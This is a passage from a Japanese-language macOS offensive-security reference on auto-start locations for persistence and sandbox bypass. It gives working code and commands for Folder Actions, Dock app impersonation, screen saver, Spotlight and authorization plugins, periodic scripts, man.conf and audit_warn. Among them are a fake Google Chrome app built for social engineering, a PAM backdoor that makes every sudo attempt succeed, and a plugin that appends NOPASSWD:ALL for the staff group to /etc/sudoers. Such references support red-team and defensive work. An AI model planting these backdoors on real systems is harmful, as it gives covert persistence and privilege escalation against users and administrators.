- ただし、Folder Actions を設定するには、引数付きで `osascript` を呼び出して **`System Events`** に接続できる必要があります
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
- Desktop、Documents、Downloads などの基本的な TCC permissions があります

#### Location

- **`/Library/Scripts/Folder Action Scripts`**
- Root が必要
- **Trigger**: 指定した folder へのアクセス
- **`~/Library/Scripts/Folder Action Scripts`**
- **Trigger**: 指定した folder へのアクセス

#### Description & Exploitation

Folder Actions は、項目の追加や削除、folder window の開閉やサイズ変更など、folder の変更によって自動的に trigger される scripts です。これらの actions はさまざまなタスクに利用でき、Finder UI や terminal commands など、複数の方法で trigger できます。

Folder Actions を設定するには、次のような方法があります。

1. [Automator](https://support.apple.com/guide/automator/welcome/mac) で Folder Action workflow を作成し、service としてインストールする。
2. folder の context menu にある Folder Actions Setup から、script を手動で割り当てる。
3. OSAScript を使用して `System Events.app` に Apple Event messages を送信し、Folder Action を programmatically に設定する。
- この method は action を system に組み込む場合に特に有用で、ある程度の persistence を実現できます。

以下の script は、Folder Action によって実行できる内容の例です。
```applescript
// source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
上記のスクリプトをFolder Actionsで使用できるようにするには、次のコマンドでコンパイルします:
```bash
osacompile -l JavaScript -o folder.scpt source.js
```
スクリプトをコンパイルした後、以下のスクリプトを実行して Folder Actions を設定します。このスクリプトは Folder Actions をグローバルに有効化し、先ほどコンパイルしたスクリプトを Desktop フォルダに関連付けます。
```javascript
// Enabling and attaching Folder Action
var se = Application("System Events")
se.folderActionsEnabled = true
var myScript = se.Script({ name: "source.js", posixPath: "/tmp/source.js" })
var fa = se.FolderAction({ name: "Desktop", path: "/Users/username/Desktop" })
se.folderActions.push(fa)
fa.scripts.push(myScript)
```
次のコマンドでセットアップスクリプトを実行します：
```bash
osascript -l JavaScript /Users/username/attach.scpt
```
- これは GUI 経由でこの persistence を実装する方法です。

これは実行される script です：
```applescript:source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
以下でコンパイルします: `osacompile -l JavaScript -o folder.scpt source.js`

以下に移動します:
```bash
mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
```
Then、`Folder Actions Setup` appを開き、**監視したいフォルダー**を選択し、今回のケースでは **`folder.scpt`**（私の場合は output2.scp と呼んでいました）を選択します：

<figure><img src="../images/image (39).png" alt="" width="297"><figcaption></figcaption></figure>

これで、**Finder**でそのフォルダーを開くと、スクリプトが実行されます。

この設定は、**`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`**にある**plist**にbase64形式で保存されました。

それでは、GUIアクセスなしでこの永続化を準備してみましょう：

1. バックアップのため、**`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`**を`/tmp`に**コピー**します：
- `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
2. 先ほど設定したFolder Actionsを**削除**します：

<figure><img src="../images/image (40).png" alt=""><figcaption></figcaption></figure>

これで空の環境ができました。

3. バックアップファイルをコピーします：`cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
4. この設定を読み込むため、Folder Actions Setup.appを開きます：`open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`

> [!CAUTION]
> これは私の環境では機能しませんでしたが、以下はwriteupの手順です：

### Dock shortcuts

Writeup: [https://theevilbit.github.io/beyond/beyond_0027/](https://theevilbit.github.io/beyond/beyond_0027/)

- sandboxのbypassに有用： [✅](https://emojipedia.org/check-mark-button)
- ただし、system内にmalicious applicationをインストールしておく必要があります
- TCC bypass： [🔴](https://emojipedia.org/large-red-circle)

#### Location

- `~/Library/Preferences/com.apple.dock.plist`
- **Trigger**：ユーザーがDock内のアプリをクリックしたとき

#### Description & Exploitation

Dockに表示されるすべてのアプリケーションはplist内で指定されています：**`~/Library/Preferences/com.apple.dock.plist`**

次のコマンドだけで**アプリケーションを追加**できます：
```bash
# Add /System/Applications/Books.app
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'

# Restart Dock
killall Dock
```
**social engineering** を利用すれば、**Google Chrome** などを dock 内で**impersonate**し、実際に独自のスクリプトを実行できます：
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
echo '#!/bin/sh
open /Applications/Google\ Chrome.app/ &
touch /tmp/ImGoogleChrome' > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
killall Dock
```
### Color Pickers

Writeup: [https://theevilbit.github.io/beyond/beyond_0017](https://theevilbit.github.io/beyond/beyond_0017/)

- sandbox の bypass に有用: [🟠](https://emojipedia.org/large-orange-circle)
- 非常に特定のアクションが実行される必要がある
- 別の sandbox に移行する
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- `/Library/ColorPickers`
- root が必要
- Trigger: color picker を使用する
- `~/Library/ColorPickers`
- Trigger: color picker を使用する

#### Description & Exploit

**自身のコードを使って color picker** bundle を compile し（例として[**こちら**](https://github.com/viktorstrate/color-picker-plus)を使用できます）、constructor を追加し（[Screen Saver section](macos-auto-start-locations.md#screen-saver)と同様）、bundle を `~/Library/ColorPickers` にコピーします。

その後、color picker が Trigger されると、コードも同様に実行されます。

library を load する binary には、**非常に restrictive な sandbox** があることに注意してください: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`
```bash
[Key] com.apple.security.temporary-exception.sbpl
[Value]
[Array]
[String] (deny file-write* (home-subpath "/Library/Colors"))
[String] (allow file-read* process-exec file-map-executable (home-subpath "/Library/ColorPickers"))
[String] (allow file-read* (extension "com.apple.app-sandbox.read"))
```
### Finder Sync Plugins

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0026/](https://theevilbit.github.io/beyond/beyond_0026/)\
**Writeup**: [https://objective-see.org/blog/blog_0x11.html](https://objective-see.org/blog/blog_0x11.html)

- sandbox の bypass に有用: **いいえ、自分の app を実行する必要があるため**
- TCC bypass: ???

#### Location

- 特定の app

#### Description & Exploit

Finder Sync Extension を使用するアプリケーションの例は[こちらにあります](https://github.com/D00MFist/InSync)。

アプリケーションには `Finder Sync Extensions` を追加できます。この extension は実行されるアプリケーション内に配置されます。さらに、extension が code を実行するには、**有効な Apple developer certificate で署名されていること**、**sandbox 化されていること**（ただし、緩和された exception を追加することは可能）、そして次のようなものに登録されていることが**必須**です。
```bash
pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
pluginkit -e use -i com.example.InSync.InSync
```
### Screen Saver

Writeup: [https://theevilbit.github.io/beyond/beyond_0016/](https://theevilbit.github.io/beyond/beyond_0016/)\
Writeup: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)

- sandbox の bypass に有用: [🟠](https://emojipedia.org/large-orange-circle)
- ただし、最終的には一般的な application sandbox 内に入る
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- `/System/Library/Screen Savers`
- Root が必要
- **Trigger**: Screen Saver を選択
- `/Library/Screen Savers`
- Root が必要
- **Trigger**: Screen Saver を選択
- `~/Library/Screen Savers`
- **Trigger**: Screen Saver を選択

<figure><img src="../images/image (38).png" alt="" width="375"><figcaption></figcaption></figure>

#### Description & Exploit

Xcode で新しいプロジェクトを作成し、新しい **Screen Saver** を生成するテンプレートを選択します。その後、コードを追加します。例えば、以下のコードでログを生成できます。

**Build** し、`.saver` bundle を **`~/Library/Screen Savers`** にコピーします。次に、Screen Saver GUI を開いてクリックするだけで、多数のログが生成されるはずです：
```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'

Timestamp                       (process)[PID]
2023-09-27 22:55:39.622369+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver void custom(int, const char **)
2023-09-27 22:55:39.622623+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView initWithFrame:isPreview:]
2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
```
> [!CAUTION]
> この code を load する binary（`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`）の entitlements 内には **`com.apple.security.app-sandbox`** があるため、**common application sandbox** 内に入ることになります。

Saver code：
```objectivec
//
//  ScreenSaverExampleView.m
//  ScreenSaverExample
//
//  Created by Carlos Polop on 27/9/23.
//

#import "ScreenSaverExampleView.h"

@implementation ScreenSaverExampleView

- (instancetype)initWithFrame:(NSRect)frame isPreview:(BOOL)isPreview
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
self = [super initWithFrame:frame isPreview:isPreview];
if (self) {
[self setAnimationTimeInterval:1/30.0];
}
return self;
}

- (void)startAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super startAnimation];
}

- (void)stopAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super stopAnimation];
}

- (void)drawRect:(NSRect)rect
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super drawRect:rect];
}

- (void)animateOneFrame
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return;
}

- (BOOL)hasConfigureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return NO;
}

- (NSWindow*)configureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return nil;
}

__attribute__((constructor))
void custom(int argc, const char **argv) {
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
}

@end
```
### Spotlight Plugins

writeup: [https://theevilbit.github.io/beyond/beyond_0011/](https://theevilbit.github.io/beyond/beyond_0011/)

- sandbox bypass に有用: [🟠](https://emojipedia.org/large-orange-circle)
- ただし、最終的には application sandbox 内に入る
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
- sandbox は非常に制限されているように見える

#### Location

- `~/Library/Spotlight/`
- **Trigger**: Spotlight plugin によって管理される拡張子を持つ新しいファイルが作成される。
- `/Library/Spotlight/`
- **Trigger**: Spotlight plugin によって管理される拡張子を持つ新しいファイルが作成される。
- root が必要
- `/System/Library/Spotlight/`
- **Trigger**: Spotlight plugin によって管理される拡張子を持つ新しいファイルが作成される。
- root が必要
- `Some.app/Contents/Library/Spotlight/`
- **Trigger**: Spotlight plugin によって管理される拡張子を持つ新しいファイルが作成される。
- 新しい app が必要

#### Description & Exploitation

Spotlight は macOS に組み込まれた検索機能で、ユーザーが **コンピューター上のデータに迅速かつ包括的にアクセスできるように** 設計されている。\
この高速な検索機能を実現するため、Spotlight は **独自のデータベース** を保持し、**ほとんどのファイルを解析する** ことで index を作成する。これにより、ファイル名とファイル内容の両方を素早く検索できる。

Spotlight の基盤となる仕組みには、'mds' という名前の中央プロセスがあり、これは **'metadata server'** を意味する。このプロセスが Spotlight service 全体を統括する。これを補完する形で、複数の 'mdworker' daemon が、さまざまなファイル形式の index 作成など、多様な maintenance task を実行する（`ps -ef | grep mdworker`）。これらの task は Spotlight importer plugin、つまり **".mdimporter bundles**" によって可能になる。これらにより、Spotlight は多様なファイル形式の content を理解し、index 化できる。

plugin または **`.mdimporter`** bundle は前述の場所にあり、新しい bundle が出現すると 1 分以内に load される（service の restart は不要）。これらの bundle は、**管理できる file type と拡張子** を指定する必要がある。これにより、指定された拡張子を持つ新しいファイルが作成された際、Spotlight はそれらを使用する。

load されている **すべての `mdimporters`** は、次のコマンドを実行して確認できる。
```bash
mdimport -L
Paths: id(501) (
"/System/Library/Spotlight/iWork.mdimporter",
"/System/Library/Spotlight/iPhoto.mdimporter",
"/System/Library/Spotlight/PDF.mdimporter",
[...]
```
また、例えば **/Library/Spotlight/iBooksAuthor.mdimporter** は、次のような種類のファイル（拡張子 `.iba` や `.book` など）を解析するために使用されます：
```json
plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist

[...]
"CFBundleDocumentTypes" => [
0 => {
"CFBundleTypeName" => "iBooks Author Book"
"CFBundleTypeRole" => "MDImporter"
"LSItemContentTypes" => [
0 => "com.apple.ibooksauthor.book"
1 => "com.apple.ibooksauthor.pkgbook"
2 => "com.apple.ibooksauthor.template"
3 => "com.apple.ibooksauthor.pkgtemplate"
]
"LSTypeIsPackage" => 0
}
]
[...]
=> {
"UTTypeConformsTo" => [
0 => "public.data"
1 => "public.composite-content"
]
"UTTypeDescription" => "iBooks Author Book"
"UTTypeIdentifier" => "com.apple.ibooksauthor.book"
"UTTypeReferenceURL" => "http://www.apple.com/ibooksauthor"
"UTTypeTagSpecification" => {
"public.filename-extension" => [
0 => "iba"
1 => "book"
]
}
}
[...]
```
> [!CAUTION]
> 他の `mdimporter` の Plist を確認しても、**`UTTypeConformsTo`** のエントリが見つからない場合があります。これは組み込みの _Uniform Type Identifiers_ ([UTI](https://en.wikipedia.org/wiki/Uniform_Type_Identifier)) であり、拡張子を指定する必要がないためです。
>
> さらに、System のデフォルトプラグインが常に優先されるため、攻撃者がアクセスできるのは、Apple 独自の `mdimporters` によって別途インデックス化されていないファイルのみです。

独自の importer を作成するには、まずこのプロジェクトを利用できます: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer)。その後、名前と **`CFBundleDocumentTypes`** を変更し、**`UTImportedTypeDeclarations`** を追加して、サポートしたい拡張子に対応させ、**`schema.xml`** にも反映します。\
次に、**`GetMetadataForFile`** 関数の code を変更し、処理対象の拡張子を持つファイルが作成されたときに payload を実行するようにします。

最後に、新しい **`.mdimporter`** を build して、前述の3つの場所のいずれかに copy します。ロードされたかどうかは、**ログを monitoring** するか、**`mdimport -L.`** を確認することで検証できます。

### ~~Preference Pane~~

> [!CAUTION]
> これはもう動作しないようです。

Writeup: [https://theevilbit.github.io/beyond/beyond_0009/](https://theevilbit.github.io/beyond/beyond_0009/)

- sandbox bypass に有用: [🟠](https://emojipedia.org/large-orange-circle)
- 特定の user action が必要
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`/System/Library/PreferencePanes`**
- **`/Library/PreferencePanes`**
- **`~/Library/PreferencePanes`**

#### Description

これはもう動作しないようです。

## Root Sandbox Bypass

> [!TIP]
> ここでは、**root** でファイルに**書き込むだけで**何かを実行できる、またはその他の **奇妙な条件が必要となる**、**sandbox bypass** に有用な start location を紹介します。

### Periodic

Writeup: [https://theevilbit.github.io/beyond/beyond_0019/](https://theevilbit.github.io/beyond/beyond_0019/)

- sandbox bypass に有用: [🟠](https://emojipedia.org/large-orange-circle)
- ただし root である必要がある
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- `/etc/periodic/daily`, `/etc/periodic/weekly`, `/etc/periodic/monthly`, `/usr/local/etc/periodic`
- root が必要
- **Trigger**: 時刻になるとき
- `/etc/daily.local`, `/etc/weekly.local` または `/etc/monthly.local`
- root が必要
- **Trigger**: 時刻になるとき

#### Description & Exploitation

Periodic scripts（**`/etc/periodic`**）は、**`/System/Library/LaunchDaemons/com.apple.periodic*`** に設定された **launch daemons** によって実行されます。`/etc/periodic/` に保存された scripts は、**ファイルの owner として**実行されるため、これは潜在的な privilege escalation には利用できない点に注意してください。
```bash
# Launch daemons that will execute the periodic scripts
ls -l /System/Library/LaunchDaemons/com.apple.periodic*
-rw-r--r--  1 root  wheel  887 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-daily.plist
-rw-r--r--  1 root  wheel  895 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-monthly.plist
-rw-r--r--  1 root  wheel  891 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-weekly.plist

# The scripts located in their locations
ls -lR /etc/periodic
total 0
drwxr-xr-x  11 root  wheel  352 May 13 00:29 daily
drwxr-xr-x   5 root  wheel  160 May 13 00:29 monthly
drwxr-xr-x   3 root  wheel   96 May 13 00:29 weekly

/etc/periodic/daily:
total 72
-rwxr-xr-x  1 root  wheel  1642 May 13 00:29 110.clean-tmps
-rwxr-xr-x  1 root  wheel   695 May 13 00:29 130.clean-msgs
[...]

/etc/periodic/monthly:
total 24
-rwxr-xr-x  1 root  wheel   888 May 13 00:29 199.rotate-fax
-rwxr-xr-x  1 root  wheel  1010 May 13 00:29 200.accounting
-rwxr-xr-x  1 root  wheel   606 May 13 00:29 999.local

/etc/periodic/weekly:
total 8
-rwxr-xr-x  1 root  wheel  620 May 13 00:29 999.local
```
**`/etc/defaults/periodic.conf`** に、実行されるその他の定期スクリプトが指定されています：
```bash
grep "Local scripts" /etc/defaults/periodic.conf
daily_local="/etc/daily.local"				# Local scripts
weekly_local="/etc/weekly.local"			# Local scripts
monthly_local="/etc/monthly.local"			# Local scripts
```
`/etc/daily.local`、`/etc/weekly.local`、`/etc/monthly.local` のいずれかのファイルに書き込めれば、**遅かれ早かれ実行されます**。

> [!WARNING]
> periodic script は、**その script の owner として実行される**ことに注意してください。したがって、通常の user が script を所有している場合、その user として実行されます（これにより privilege escalation attacks が防がれる可能性があります）。

### PAM

Writeup: [Linux Hacktricks PAM](../linux-hardening/software-information/pam-pluggable-authentication-modules.md)\
Writeup: [https://theevilbit.github.io/beyond/beyond_0005/](https://theevilbit.github.io/beyond/beyond_0005/)

- sandbox の bypass に有用: [🟠](https://emojipedia.org/large-orange-circle)
- ただし root である必要があります
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- 常に root が必要

#### Description & Exploitation

PAM は macOS 内での簡単な実行よりも、**persistence** や malware に重点が置かれているため、この blog では詳しい説明をしません。**この technique をよりよく理解するには writeup を読んでください**。

次のコマンドで PAM modules を確認します：
```bash
ls -l /etc/pam.d
```
PAMを悪用したpersistence/privilege escalation techniqueは、モジュール`/etc/pam.d/sudo`を変更し、先頭に次の行を追加するだけで実行できます:
```bash
auth       sufficient     pam_permit.so
```
したがって、次のようなものに**見えます**：
```bash
# sudo: auth account password session
auth       sufficient     pam_permit.so
auth       include        sudo_local
auth       sufficient     pam_smartcard.so
auth       required       pam_opendirectory.so
account    required       pam_permit.so
password   required       pam_deny.so
session    required       pam_permit.so
```
したがって、**`sudo` を使用する試みはすべて成功します**。

> [!CAUTION]
> このディレクトリは TCC によって保護されているため、ユーザーにアクセス許可を求める prompt が表示される可能性が非常に高いことに注意してください。

もう1つの良い例は `su` です。PAM modules にパラメータを渡すことも可能であることが確認できます（このファイルを backdoor することも可能です）。
```bash
cat /etc/pam.d/su
# su: auth account session
auth       sufficient     pam_rootok.so
auth       required       pam_opendirectory.so
account    required       pam_group.so no_warn group=admin,wheel ruser root_only fail_safe
account    required       pam_opendirectory.so no_check_shell
password   required       pam_opendirectory.so
session    required       pam_launchd.so
```
### Authorization Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)\
Writeup: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)

- sandboxのbypassに有用: [🟠](https://emojipedia.org/large-orange-circle)
- ただし、rootである必要があり、追加の設定を行う必要がある
- TCC bypass: ???

#### 場所

- `/Library/Security/SecurityAgentPlugins/`
- root権限が必要
- pluginを使用するようauthorization databaseを設定する必要もある

#### 説明とExploitation

ユーザーがログインしたときに実行されるauthorization pluginを作成し、persistenceを維持できます。このようなpluginの作成方法については、以前のwriteupを確認してください（また、粗雑に記述されたpluginによってシステムから締め出される可能性があり、その場合はrecovery modeからMacをクリーンアップする必要があります）。
```objectivec
// Compile the code and create a real bundle
// gcc -bundle -framework Foundation main.m -o CustomAuth
// mkdir -p CustomAuth.bundle/Contents/MacOS
// mv CustomAuth CustomAuth.bundle/Contents/MacOS/

#import <Foundation/Foundation.h>

__attribute__((constructor)) static void run()
{
NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
}
```
**bundle**を読み込まれる場所に**移動**します:
```bash
cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
```
最後に、この Plugin をロードするための **rule** を追加します：
```bash
cat > /tmp/rule.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>class</key>
<string>evaluate-mechanisms</string>
<key>mechanisms</key>
<array>
<string>CustomAuth:login,privileged</string>
</array>
</dict>
</plist>
EOF

security authorizationdb write com.asdf.asdf < /tmp/rule.plist
```
**`evaluate-mechanisms`** は、認可 framework に対して **認可のために外部 mechanism を呼び出す必要がある**ことを伝えます。さらに、**`privileged`** によって root として実行されます。

次のように実行して trigger します:
```bash
security authorize com.asdf.asdf
```
そして、**staff group には sudo** access が必要です（`/etc/sudoers` を読んで確認してください）。

### Man.conf

Writeup: [https://theevilbit.github.io/beyond/beyond_0030/](https://theevilbit.github.io/beyond/beyond_0030/)

- sandbox の bypass に有用: [🟠](https://emojipedia.org/large-orange-circle)
- ただし root である必要があり、ユーザーが man を使用しなければならない
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`/private/etc/man.conf`**
- root が必要
- **`/private/etc/man.conf`**: man が使用されるたび

#### Description & Exploit

設定ファイル **`/private/etc/man.conf`** は、man の documentation files を開く際に使用する binary/script を指定します。そのため、executable への path を変更すれば、ユーザーが man を使用してドキュメントを読むたびに backdoor が実行されます。

例えば、**`/private/etc/man.conf`** に次のように設定します。
```
MANPAGER /tmp/view
```
そして、`/tmp/view` を次の内容で作成します:
```bash
#!/bin/zsh

touch /tmp/manconf

/usr/bin/less -s
```
### Apache2

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)

- sandbox の bypass に有用: [🟠](https://emojipedia.org/large-orange-circle)
- ただし、root である必要があり、apache が実行中でなければならない
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
- Httpd には entitlements がない

#### Location

- **`/etc/apache2/httpd.conf`**
- root が必要
- Trigger: Apache2 の起動時

#### Description & Exploit

`/etc/apache2/httpd.conf` に、次のような行を追加して module を load するよう指定できます:
```bash
LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
```
この方法で、コンパイルしたモジュールが Apache によってロードされます。必要なのは、**有効な Apple certificate で署名する**か、システムに**新しい信頼済み certificate を追加して**、それで**署名する**ことだけです。

次に、必要であれば、server が起動されることを確認するために、以下を実行できます：
```bash
sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
```
Dylb のコード例:
```objectivec
#include <stdio.h>
#include <syslog.h>

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
printf("[+] dylib constructor called from %s\n", argv[0]);
syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
}
```
### BSM audit framework

Writeup: [https://theevilbit.github.io/beyond/beyond_0031/](https://theevilbit.github.io/beyond/beyond_0031/)

- sandbox の bypass に有用: [🟠](https://emojipedia.org/large-orange-circle)
- ただし、root であり、auditd が実行中で、warning を発生させる必要がある
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`/etc/security/audit_warn`**
- root が必要
- **Trigger**: auditd が warning を検知したとき

#### Description & Exploit

auditd が warning を検知するたびに、スクリプト **`/etc/security/audit_warn`** が **実行されます**。そのため、そこに payload を追加できます。
```bash
echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
```
You could force a warning with `sudo audit -n`.

### Startup Items

> [!CAUTION] > **これは deprecated であるため、これらのディレクトリには何も見つからないはずです。**

**StartupItem** は、`/Library/StartupItems/` または `/System/Library/StartupItems/` のいずれかに配置されるディレクトリです。このディレクトリを作成したら、次の2つの特定のファイルを含める必要があります。

1. **rc script**: startup 時に実行される shell script。
2. `StartupParameters.plist` という名前の **plist file**。各種 configuration settings が含まれます。

startup process がこれらを認識して利用できるように、rc script と `StartupParameters.plist` file の両方が **StartupItem** directory 内に正しく配置されていることを確認してください。

{{#tabs}}
{{#tab name="StartupParameters.plist"}}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Description</key>
<string>This is a description of this service</string>
<key>OrderPreference</key>
<string>None</string> <!--Other req services to execute before this -->
<key>Provides</key>
<array>
<string>superservicename</string> <!--Name of the services provided by this file -->
</array>
</dict>
</plist>
```
{{#endtab}}

{{#tab name="superservicename"}}
```bash
#!/bin/sh
. /etc/rc.common

StartService(){
touch /tmp/superservicestarted
}

StopService(){
rm /tmp/superservicestarted
}

RestartService(){
echo "Restarting"
}

RunService "$1"
```
{{#endtab}}
{{#endtabs}}

### ~~emond~~

> [!CAUTION]
> このコンポーネントをmacOSで見つけられないため、詳細についてはwriteupを確認してください

Writeup: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)

Appleによって導入された**emond**は、開発が不十分、あるいは放棄された可能性があるように見えるlogging mechanismですが、現在もアクセス可能です。Mac管理者にとって特に有益なものではありませんが、このあまり知られていないserviceは、threat actorにとって、ほとんどのmacOS管理者に気づかれない可能性が高い、目立たないpersistence methodとして利用できます。

その存在を知っていれば、**emond**の悪意ある使用を特定するのは簡単です。このserviceのシステム上のLaunchDaemonは、単一のdirectory内で実行するscriptsを探します。これを確認するには、次のcommandを使用できます：
```bash
ls -l /private/var/db/emondClients
```
### ~~XQuartz~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)

#### 場所

- **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
- Root 権限が必要
- **Trigger**: XQuartz 使用時

#### 説明と Exploit

XQuartz は **macOS にインストールされなくなった**ため、詳細については writeup を確認してください。

### ~~kext~~

> [!CAUTION]
> root であっても kext のインストールは非常に複雑なため、sandbox からの escape や persistence の手段としては考慮しません（exploit がある場合を除く）。

#### 場所

KEXT を startup item としてインストールするには、**以下のいずれかの場所にインストール**する必要があります。

- `/System/Library/Extensions`
- OS X operating system に組み込まれた KEXT ファイル
- `/Library/Extensions`
- 3rd party software によってインストールされた KEXT ファイル

現在ロードされている kext ファイルは、次のコマンドで一覧表示できます。
```bash
kextstat #List loaded kext
kextload /path/to/kext.kext #Load a new one based on path
kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
kextunload /path/to/kext.kext
kextunload -b com.apple.driver.ExampleBundle
```
詳細については、[**kernel extensions についてはこちらのセクションを確認してください**](macos-security-and-privilege-escalation/mac-os-architecture/index.html#i-o-kit-drivers)。

### ~~amstoold~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0029/](https://theevilbit.github.io/beyond/beyond_0029/)

#### Location

- **`/usr/local/bin/amstoold`**
- Root が必要

#### Description & Exploitation

どうやら `/System/Library/LaunchAgents/com.apple.amstoold.plist` の `plist` は、XPC service を公開しながらこの binary を使用していたようです。ただし、その binary は存在しなかったため、そこに何かを配置しておけば、XPC service が呼び出されたときにその binary も呼び出されます。

現在の macOS では、これを見つけることができません。

### ~~xsanctl~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0015/](https://theevilbit.github.io/beyond/beyond_0015/)

#### Location

- **`/Library/Preferences/Xsan/.xsanrc`**
- Root が必要
- **Trigger**: service が実行されたとき（まれ）

#### Description & exploit

